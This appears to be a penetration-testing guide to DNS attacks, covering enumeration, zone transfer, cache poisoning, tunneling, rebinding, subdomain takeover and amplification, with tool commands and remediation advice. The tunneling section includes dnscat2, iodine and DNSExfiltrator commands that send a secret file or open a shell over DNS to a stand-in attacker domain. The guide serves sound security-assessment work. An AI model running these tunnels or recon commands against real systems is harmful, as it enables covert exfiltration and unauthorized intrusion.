# DNS Attack Testing

## Overview
DNS (Domain Name System) is a critical infrastructure service that translates domain names to IP addresses. Due to its foundational role in networking, DNS attacks can have far-reaching consequences including traffic redirection, data exfiltration, service disruption, and complete domain takeover. DNS attack testing evaluates the resilience of DNS infrastructure against zone transfers, cache poisoning, tunneling, rebinding, subdomain takeover, and enumeration attacks.

## Classification
- **CWE:** CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-346 (Origin Validation Error), CWE-200 (Information Exposure)
- **MITRE ATT&CK:** T1071.004 (Application Layer Protocol: DNS), T1568 (Dynamic Resolution), T1584.001 (Domains), T1583.001 (Acquire Infrastructure: Domains)
- **CVSS Base:** 4.3 - 9.1 (Medium to Critical, depending on attack type)

## Detection Methodology

### 1. DNS Enumeration and Reconnaissance
```bash
# Basic DNS queries
dig target.com ANY
dig target.com A
dig target.com AAAA
dig target.com MX
dig target.com NS
dig target.com TXT
dig target.com SOA
dig target.com CNAME

# Reverse DNS lookup
dig -x 10.10.10.50
nmap -sL 10.10.10.0/24    # List scan with reverse DNS

# DNS server version disclosure
dig @dns-server version.bind CHAOS TXT
dig @dns-server hostname.bind CHAOS TXT

# DNSSEC check
dig target.com DNSKEY +dnssec
dig target.com DS +trace
```

### 2. DNS Zone Transfer (AXFR)
Attempt to retrieve the complete DNS zone file from an authoritative nameserver:
```bash
# Identify nameservers
dig target.com NS

# Attempt zone transfer
dig @ns1.target.com target.com AXFR
dig @ns2.target.com target.com AXFR

# Using host command
host -t axfr target.com ns1.target.com

# Using nmap
nmap --script=dns-zone-transfer -p 53 ns1.target.com --script-args dns-zone-transfer.domain=target.com

# dnsrecon zone transfer
dnsrecon -d target.com -t axfr

# fierce (zone transfer + brute force fallback)
fierce --domain target.com --dns-servers ns1.target.com
```

### 3. Subdomain Brute Force
```bash
# Subfinder (passive + active)
subfinder -d target.com -all -o subdomains.txt

# Amass (comprehensive subdomain discovery)
amass enum -d target.com -o amass_output.txt
amass enum -d target.com -brute -w wordlist.txt

# gobuster DNS mode
gobuster dns -d target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50

# dnsrecon brute force
dnsrecon -d target.com -t brt -D wordlist.txt

# Knockpy
knockpy target.com

# massdns (high-speed resolution)
massdns -r resolvers.txt -t A -o S subdomains.txt > resolved.txt

# puredns (fast, handles wildcards)
puredns bruteforce wordlist.txt target.com -r resolvers.txt

# Altdns (permutation/alteration subdomain discovery)
altdns -i subdomains.txt -o altered.txt -w words.txt -r -s resolved_altered.txt
```

### 4. DNS Cache Poisoning
```bash
# Kaminsky attack concept:
# 1. Send flood of queries for random subdomains of target domain
# 2. Race DNS resolver with forged responses containing attacker's NS records
# 3. If forged response arrives before legitimate one, cache is poisoned

# Check for source port randomization (mitigates cache poisoning)
dig +short porttest.dns-oarc.net TXT @target-resolver

# Check DNSSEC validation
dig +dnssec target.com @target-resolver

# Test with dns-cache-snoop nmap script
nmap --script=dns-cache-snoop -p 53 target-resolver

# Birthday attack estimation
# Requires guessing the Transaction ID (16-bit) and source port
# Modern resolvers use source port randomization (65536 * 65536 combinations)
```

### 5. DNS Tunneling
Exfiltrate data or establish command-and-control through DNS queries:
```bash
# iodine (IP-over-DNS tunnel)
# Server (attacker's authoritative DNS)
iodined -c -P password 10.0.0.1/24 tunnel.attacker.com

# Client (from target network)
iodine -P password tunnel.attacker.com
# Creates a tun interface for IP tunneling through DNS

# dnscat2 (C2 over DNS)
# Server
dnscat2-server tunnel.attacker.com

# Client
dnscat2 tunnel.attacker.com
# Provides shell, file transfer, port forwarding over DNS

# dns2tcp
# Server
dns2tcpd -f /etc/dns2tcpd.conf
# Client
dns2tcpc -r ssh -l 2222 -z tunnel.attacker.com

# DNSExfiltrator (data exfiltration)
python3 dnsexfiltrator.py -d tunnel.attacker.com -f secret_file.txt

# Detection: look for abnormal DNS patterns
# - High volume of TXT/NULL/CNAME queries to single domain
# - Long subdomain labels (base64 encoded data)
# - High query frequency from single host
# - Unusual record types (TXT with large payloads)
```

### 6. DNS Rebinding
```bash
# Attack concept:
# 1. Victim visits attacker-controlled page (evil.com)
# 2. evil.com initially resolves to attacker IP (passes SOP check)
# 3. After page loads, DNS TTL expires
# 4. evil.com re-resolves to internal IP (e.g., 192.168.1.1)
# 5. JavaScript on page now accesses internal resources under evil.com origin

# Singularity (DNS rebinding framework)
# Set up rebinding server
singularity -ResponseIPAddr attacker_ip -ResponseReboundIPAddr 192.168.1.1

# rbndr (DNS rebinding service)
# Use existing services: rbndr.us, lock.cmpxchg8b.com
# Format: <attacker_ip>.<target_ip>.rbndr.us
# e.g., 1.2.3.4.192.168.1.1.rbndr.us

# Mitigation check: test if application validates Host header
curl -H "Host: evil.com" http://target-service/
```

### 7. Subdomain Takeover
```bash
# Identify dangling DNS records pointing to unclaimed resources
# Common vulnerable services: AWS S3, Azure, GitHub Pages, Heroku, Shopify

# subjack (automated takeover detection)
subjack -w subdomains.txt -t 20 -timeout 30 -o takeover_results.txt -ssl

# nuclei subdomain takeover templates
nuclei -l subdomains.txt -t takeovers/ -o takeover_results.txt

# can-i-take-over-xyz (reference)
# Check CNAME targets against known vulnerable services

# Manual detection
dig subdomain.target.com CNAME
# If CNAME points to service.amazonaws.com but bucket doesn't exist -> takeover possible
# If CNAME points to something.herokuapp.com but app doesn't exist -> takeover possible

# Verify with HTTP response
curl -v https://subdomain.target.com
# Look for: NoSuchBucket (S3), "There isn't a GitHub Pages site" (GitHub), 404 (Heroku)

# Automated with subzy
subzy run --targets subdomains.txt
```

### 8. DNS Amplification/Reflection DDoS
```bash
# Test if DNS server allows recursion (potential amplifier)
dig @target-dns any isc.org +norecurse
dig @target-dns any . +norecurse

# Check recursion enabled
nmap --script=dns-recursion -p 53 target-dns

# Amplification factor testing (DO NOT use against unauthorized targets)
# ANY query response can be 28-54x larger than query
# DNSSEC signed responses provide even higher amplification
```

## Tool Usage

### dnsrecon
```bash
# Standard enumeration
dnsrecon -d target.com

# Zone transfer
dnsrecon -d target.com -t axfr

# Brute force
dnsrecon -d target.com -t brt -D wordlist.txt

# Reverse lookup range
dnsrecon -r 10.10.10.0/24

# Cache snooping
dnsrecon -t snoop -D domains.txt -n target-dns

# Google enumeration
dnsrecon -d target.com -t goo
```

### dnsenum
```bash
# Full enumeration (zone transfer + brute force + Google)
dnsenum target.com

# With specific wordlist
dnsenum --dnsserver ns1.target.com --enum -f wordlist.txt target.com

# With thread count
dnsenum --threads 50 target.com
```

### fierce
```bash
# Domain scan with zone transfer attempt
fierce --domain target.com

# With custom DNS server
fierce --domain target.com --dns-servers ns1.target.com

# Subdomain brute force
fierce --domain target.com --subdomain-file wordlist.txt
```

## Remediation
1. **Disable zone transfers** -- restrict AXFR to authorized secondary nameservers only
2. **Deploy DNSSEC** -- sign zones to prevent cache poisoning and response forgery
3. **Source port randomization** -- ensure DNS resolvers randomize query source ports
4. **Disable open recursion** -- configure DNS servers to only serve authorized clients
5. **Monitor DNS traffic** -- detect tunneling via abnormal query volume, payload size, or record types
6. **Remove dangling records** -- audit DNS records regularly, remove CNAMEs to decommissioned services
7. **Rate limiting** -- implement DNS response rate limiting (RRL) to mitigate amplification
8. **DNS rebinding protection** -- validate Host headers, implement split-horizon DNS
9. **DNS logging** -- enable query logging for forensic analysis and anomaly detection
10. **Use DoH/DoT** -- encrypt DNS queries with DNS-over-HTTPS or DNS-over-TLS for client privacy

## Evidence Collection
When documenting DNS attack findings:
- Zone transfer results showing complete DNS records obtained
- List of subdomains discovered through brute force or passive enumeration
- Dangling DNS records and subdomain takeover proof-of-concept
- DNS server configuration weaknesses (open recursion, missing DNSSEC)
- DNS tunneling detection indicators (query patterns, payload analysis)
- Amplification factor measurements for reflection-capable servers
- Impact assessment for each finding
- DNS server version and software identified
